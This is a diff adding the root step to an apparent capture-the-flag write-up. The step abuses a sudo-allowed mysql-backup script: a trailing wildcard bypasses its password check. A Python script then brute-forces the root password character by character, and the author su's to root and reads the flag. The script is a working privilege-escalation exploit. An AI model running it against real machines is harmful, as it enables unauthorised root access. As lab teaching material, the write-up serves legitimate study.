@@ -45,11 +45,43 @@ we can now ssh into the box as joshua to get user flag and proceed
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a1c9a152-907d-49bc-9c7f-eb783586c15d)
 
+running `sudo -l` shows we can run the mysql-backup script as sudo
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a7fdc197-aff9-45e0-a397-c0a02c46d0a2)
+
+and yeah we can guess or brute force the first password character followed by * to bypass the password prompt. and we can also brute force every character of the password till we find all characters of the password.
+
+```
+import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
+
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+```
+
+which i was able to get the root password and su as root
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e82c4557-2037-4e71-b037-ee45d145e655)
+
+so, cat the root flag
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/97e615ce-991b-4153-83ce-c03ba7d63c69)
 
 
 
-
-
+Thanks.
 
 
 
